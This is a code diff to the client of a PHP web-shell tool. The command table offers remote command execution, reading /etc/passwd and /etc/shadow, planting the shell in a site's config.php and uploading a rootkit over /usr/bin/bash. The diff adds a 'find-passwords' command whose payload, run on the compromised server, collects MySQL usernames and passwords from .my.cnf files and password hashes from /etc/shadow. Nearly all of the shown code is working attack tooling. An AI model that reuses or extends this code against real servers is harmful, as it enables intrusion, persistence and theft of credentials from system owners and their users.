@@ -20,203 +20,210 @@ class Client
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show current help messages.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_help'
             ),
             'connect'    => array(
                 'args'        => '[url]',
                 'example'     => 'connect http://127.0.0.1/server.php',
                 'description' => 'Connect to Server WebShell script.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_connect'
             ),
             'cat'        => array(
                 'args'        => '[file path]',
                 'example'     => 'cat /etc/passwd',
                 'description' => 'Show the content of remote file.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_cat'
             ),
             'tail'       => array(
                 'args'        => '[file path]',
                 'example'     => 'tail /var/log/secure',
                 'description' => 'Read the last lines of specific file.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_tail'
             ),
             'cd'         => array(
                 'args'        => '[directory]',
                 'example'     => 'cd /home/',
                 'description' => 'Navigate to specific remote directory.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_cd'
             ),
             'uname'      => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show the full info of the System Operative of the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_uname'
             ),
             'exec'       => array(
                 'args'        => '[command]',
                 'example'     => 'exec reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
                 'description' => 'Execute a simple command in remote server using the current remote path. Detect automatic available method on the server. See the force-exec command.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_exec'
             ),
             'force-exec' => array(
                 'args'        => '[method] [command]',
                 'example'     => 'force-exec passthru reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
                 'description' => 'Force execute a simple command in remote server using an specific php method in current path. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes ``).',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_force_exec'
             ),
             'edit'       => array(
                 'args'        => '[editor command] [remote file path]',
                 'example'     => 'edit vi /etc/shadow',
                 'description' => 'Edit remote file with specific local command edtor',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_edit'
             ),
             'nano'       => array(
                 'args'        => '[remote file path]',
                 'example'     => 'nano /etc/shadow',
                 'description' => 'Edit remote file with nano editor on the local system.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_nano'
             ),
             'vi'         => array(
                 'args'        => '[remote file path]',
                 'example'     => 'vi /etc/shadow',
                 'description' => 'Edit remote file with vi editor on the local system.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_vi'
             ),
             'vim'        => array(
                 'args'        => '[remote file path]',
                 'example'     => 'vim /etc/shadow',
                 'description' => 'Edit remote file with vim editor on the local system.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_vim'
             ),
             'gedit'      => array(
                 'args'        => '[remote file path]',
                 'example'     => 'gedit /etc/shadow',
                 'description' => 'Edit remote file with gedit editor on the local system.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_gedit'
             ),
             'notepad'    => array(
                 'args'        => '[remote file path]',
                 'example'     => 'notepad /etc/shadow',
                 'description' => 'Edit remote file with notepad.exe editor on the local system (only on local windows systems).',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_notepad'
             ),
             'sublime'    => array(
                 'args'        => '[remote file path]',
                 'example'     => 'sublime /etc/shadow',
                 'description' => 'Edit remote file with sublime editor on the local system.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_sublime'
             ),
             'mysql'      => array(
                 'args'        => '[host] [port] [user] [password]',
                 'example'     => 'mysql localhost 3306 root 123456',
                 'description' => 'Start an interative MySQL session',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_mysql'
             ),
             'mysqldump'  => array(
                 'args'        => '[host] [port] [user] [password] [local file]',
                 'example'     => 'mysql localhost 3306 root 123456 ./dump.sql',
                 'description' => 'Make a dump from remote database to local SQL file',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_mysqldump'
             ),
             'download'   => array(
                 'args'        => '[remote path] [local path]',
                 'example'     => 'download /home/site/public_html ./backup',
                 'description' => 'Download a backup of file or directory from server to local path. If path finish with "/" download the content of folder (like as rsync). Not need a ssh access.',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_download'
             ),
             'upload'     => array(
                 'args'        => '[local path] [remote path]',
                 'example'     => 'upload ./rootkit.bin /usr/bin/bash',
                 'description' => 'Upload a local file or directory to remote directory (maintains the same permits)',
-                'status'      => 'unimplemented',
+                'status'      => 'Unimplemented',
                 'function'    => 'cmd_upload'
             ),
             'mkdir'      => array(
                 'args'        => '[remote path]',
                 'example'     => 'mkdir /tmp/backup/',
                 'description' => 'Make a directory on the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_mkdir'
             ),
             'rm'         => array(
                 'args'        => '[remote path]',
                 'example'     => 'rm /tmp/backup/',
                 'description' => 'Delete the specific file or directory path.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_rm'
             ),
             'phpinfo'    => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show the full info of the php, libraries and enviroments of the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_phpinfo'
             ),
             'id'         => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show the full info of the current user and group on the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_id'
             ),
             'ls'         => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'List files and folders of the current path on the server. Alias of ll and dir commands.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_ls'
             ),
             'shellpath'  => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show the current local path of the WebShell server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_shellpath'
             ),
             'pwd'        => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Show the current local path on the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_pwd'
             ),
             'install'    => array(
                 'args'        => '[remote file path]',
                 'example'     => 'install /home/website/public_html/admin/config.php',
                 'description' => 'Install a copy of the WebShell on the specific remote parh, if the directory does not exist, it will create it recursively.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_install'
             ),
             'uninstall'  => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Uninstall the current WebShell on the server.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_uninstall'
+            ),
+            'find-passwords'  => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Search for all possible common passwords on the remote server.',
+                'status'      => 'Alpha',
+                'function'    => 'cmd_find_passwords'
             ),
             'exit'       => array(
                 'args'        => '',
                 'example'     => '',
                 'description' => 'Exit of the client but not remove the WebShell on the server. See uninstall. Alias of quit command.',
-                'status'      => 'stable',
+                'status'      => 'Stable',
                 'function'    => 'cmd_exit'
             )
         );
@@ -282,12 +289,13 @@ class Client
         $message = '';
         foreach($this->functions as $cmd => $properties)
         {
-            $message .= implode("\n", array(
-                ' ──────────────────────────────────────────────────',
-                '  Command     : '.$cmd.' '.$properties['args'],
-                '  Status      : '.$properties['status'],
-                '  Description : '.$properties['description'],
-            ))."\n";
+            $message .= 
+                " ──────────────────────────────────────────────────\n".
+                '  Command     : '.$cmd.' '.$properties['args']."\n".
+                ($properties['example'] ? '  Example     : '.$properties['example']."\n" : '').
+                '  Status      : '.$properties['status']."\n".
+                '  Description : '.$properties['description']."\n"
+                ;
         }
         $message .= "\n";
 
@@ -1071,6 +1079,91 @@ class Client
             $this->log('Error 500: invalid status.', $debug_level);
         }
         return false;
+    }
+
+    private function cmd_find_passwords($argv, $debug_level = 1)
+    {
+        /*
+            Sources:
+                https://pentestlab.blog/2017/04/19/stored-credentials/
+                https://www.nirsoft.net/password_recovery_tools.html
+        */
+
+        $result = $this->sendBuffer('
+            $current_dir = getcwd();
+            $result      = "";
+
+            // TODO: Wampp, Xampp, IIS, logs, config files of websites, etc.
+
+            if(strtoupper(substr(PHP_OS, 0, 3)) === "WIN")
+            {
+                // Passwords in home
+                // RDP, SMB, pppoe, etc
+                // Access to read memory
+                // Access to read HKLM
+            }
+            else
+            {
+                // Mysql Auth config files (~/.my.cnf)
+                // TODO: find / -name ".my.cnf"
+                $files = glob("{/home/*/.my.cnf,/*.my.cnf,/*/.my.cnf}", GLOB_BRACE);
+                if($files)
+                {
+                    foreach($files as $file)
+                    {
+                        if(is_readable($file))
+                        {
+                            $data = file_get_contents($file);
+
+                            $user_success     = preg_match("/user\\\\s*=\\\\s*(.+)/i", $data, $user_matches);
+                            $password_success = preg_match("/password\\\\s*=\\\\s*(.+)/i", $data, $password_matches);
+
+                            if($user_success && $password_success)
+                            {
+                                $result .= 
+                                    "──────────────────────────────────────────────────\n".
+                                    "Type          : MySQL\n".
+                                    "Location      : file:///${file}\n".
+                                    "Is accessible : Yes\n".
+                                    "User          : ".$user_matches[1]."\n".
+                                    "Password      : ".$password_matches[1]."\n"
+                                    ;
+                            }
+                        }
+                    }
+                }
+
+                // User hashes
+                if(file_exists("/etc/shadow") && is_readable("/etc/shadow"))
+                {
+                    $data = file_get_contents("/etc/shadow");
+                    if($data)
+                    {
+                        $success = preg_match_all("/^([a-z0-9_\\\\-\\\\.]+?)\\\\:([a-z0-9\\\\/\\\\\\$]{2,}?)\\\\:/im", $data, $matches);
+                        if($success)
+                        {
+                            foreach($matches[0] as $key => $match)
+                            {
+                                $result .= 
+                                    "──────────────────────────────────────────────────\n".
+                                    "Type          : Linux Hash Password\n".
+                                    "Location      : file:///etc/shadow\n".
+                                    "Is accessible : Yes\n".
+                                    "User          : ".$matches[1][$key]."\n".
+                                    "Password      : ".$matches[2][$key]."\n"
+                                    ;
+                            }
+                        }
+                    }
+                }
+            }
+        ');
+
+        if($result)
+        {
+            $this->log($result, $debug_level);
+        }
+        return $result;
     }
 
     private function cmd_exit($argv, $debug_level = 1)
